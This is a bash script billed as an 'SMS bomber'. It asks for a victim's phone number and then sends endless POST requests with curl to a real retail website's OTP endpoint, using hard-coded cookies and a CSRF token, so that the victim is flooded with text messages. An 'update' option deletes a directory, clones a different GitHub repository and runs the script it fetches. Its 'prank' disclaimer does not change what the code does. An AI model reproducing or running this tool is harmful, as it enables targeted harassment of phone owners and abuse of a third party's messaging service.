#!/bin/bash
#==========================================================================================================================
#========================================================================================================================== 
#Vaim-sms v1.0
#don't use my code with giving me credit 
#if you use without giving me credit then you won't became a programmer so please respect
#Youtube channel : https://www.youtube.com/channel/UCu-xG31hWgJLIptcPBuSigQ
#Github (coded by vaimpier ritik ) >>> : https://github.com/VaimpierOfficial
#For business : sonuv0085@gmail.com
#vaimpier
#==========================================================================================================================
#==========================================================================================================================


banner() {
clear
printf "        \e[1;91m Disclaimer: this tool is designed for Prank\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\n"
printf "\n"
}



upload() {

clear
printf "[+] UPDATING \n"
sleep 7
clear
cd
rm -rf Vaim-sms
git clone https://github.com/krishpranav/sms-bomber
cd Vaim-sms
chmod +x *
clear
printf "[+] SCRIPT UPDATED PLEASE WAIT ............. "
sleep 2
bash Vaim-sms.sh 

}

menu(){

clear
banner

printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[1;93mENTER VICITM NUMBER >>> \e[0m\n"
read -p '---------------> ' num
printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[1;93mENTER LOG FILE NAME >>> \e[0m\n"
read -p '---------------> ' log

printf "\n"
printf ">>>\e[1;92m ATTACKING START ON +91$num \e[0m<<<"
sleep 5
printf "\n"
printf "PRESS CLTR+C TO QUIT ............. \n"
sleep 3
clear
opr

}

opr(){

while true
do
curl -i -s -k -X $'POST' \
    -H $'Host: www.fbbonline.in' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://www.fbbonline.in/customer/account/create' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 436' -H $'DNT: 1' -H $'Connection: close' -H $'Cookie: _gcl_au=1.1.243953279.1596480303; __stp={\"visit\":\"returning\",\"uuid\":\"de2960e2-2dcc-4dfc-8afb-edce8db26f38\"}; _fv=cmpnpp; __stdf=0; __stgeo=\"1\"; __stbpnenable=1; historyPlpPage=0; PHPSESSID=u1c4phs0iqtfsl6b8nhh8n9r97; _st_time=1598178565; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; all_store_details=null' \
    -b $'_gcl_au=1.1.243953279.1596480303; __stp={\"visit\":\"returning\",\"uuid\":\"de2960e2-2dcc-4dfc-8afb-edce8db26f38\"}; _fv=cmpnpp; __stdf=0; __stgeo=\"1\"; __stbpnenable=1; historyPlpPage=0; PHPSESSID=u1c4phs0iqtfsl6b8nhh8n9r97; _st_time=1598178565; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; all_store_details=null' \
    --data-binary $'YII_CSRF_TOKEN=bbbef391f437ca8b30e4f2e45e998ccc9ea911e5&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D='$num'&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=sjbsj%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=malicious&RegistrationForm%5Blast_name%5D=virus&RegistrationForm%5Bpassword%5D=httpsindianvirus&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=' \
    $'https://www.fbbonline.in/customer/account/GenerateOtp' > $log.txt
done

}


menux() {

clear
apt install curl
clear
banner
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;93m SMS BOMBER \e[0m\n"
printf "\e[1;92m[\e[0m 2 \e[1;92m]\e[0m>>>\e[1;93m UPDATE SCRIPT \e[0m\n"
printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;93m QUIT \e[0m\n"
printf "\n"
read -p '~# ' options

if [ "$options" -eq "1" ];then
        menu
fi

if [ "$options" -eq "2" ];then
        upload
fi

if [ "$options" -eq "3" ];then
        exit
        exit
        exit
else
        menux
fi


}

menux